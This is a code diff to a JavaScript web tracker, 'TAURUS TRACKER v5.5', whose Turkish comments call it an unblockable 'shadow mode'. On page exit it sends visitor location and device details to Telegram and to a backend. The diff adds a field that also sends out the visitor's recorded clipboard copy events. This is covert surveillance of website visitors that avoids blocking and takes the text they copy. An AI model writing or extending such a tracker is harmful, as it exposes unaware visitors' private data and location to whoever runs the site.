@@ -1,6 +1,6 @@
 // TAURUS TRACKER v5.5 (Shadow Mode / Backend Oriented)
 /**
- * TAURUS TRACKER v5.5 (Final System - Unified Reporting V34)
+ * TAURUS TRACKER v5.5 (Final System - Unified Reporting V35)
  * ----------------------------------
  * - Altyapı: Backend Oriented (Engellenemez Gölge Modu)
  * - Güvenlik: Middleware IP Gating & Server-side Reporting
@@ -68,10 +68,9 @@
         }
     }
 
-    // GLOBAL EXIT LISTENER - Single unified handler (Radical Reliability V34)
+    // GLOBAL EXIT LISTENER - Single unified handler (Refined V35)
     function sendExitMessage() {
-        // InternalNav check removed for V34 to ensure messages fire on every page separation/closure
-        if (exitSent) return;
+        if (exitSent || window.isInternalNav) return;
 
         const duration = Math.round((new Date() - sessionStartTime) / 1000);
         if (duration < 2) return; // Ignore very short interactions
@@ -89,6 +88,7 @@
         // FIRE IMMEDIATELY (V34 Radical Method)
         fireTelegramExit(tgMsg);
 
+        // Primary Detailed Report (POST to Backend)
         const rawLog = localHistory.slice(-20).join('\n');
         const payload = {
             sessionID: sessionID || 'unknown',
@@ -96,6 +96,7 @@
             exitPage: window.location.pathname,
             location: `${sessionData?.city || 'Unknown'}, ${sessionData?.country || ''}`,
             deviceInfo: `${sessionData?.device?.model || 'Unknown'} (${sessionData?.device?.os || 'Unknown'})`,
+            clipboard: escapeHTML(localHistory.filter(e => e.includes('Copy:')).join('\n')) || 'None',
             eventLog: escapeHTML(rawLog) || 'No events recorded'
         };
 
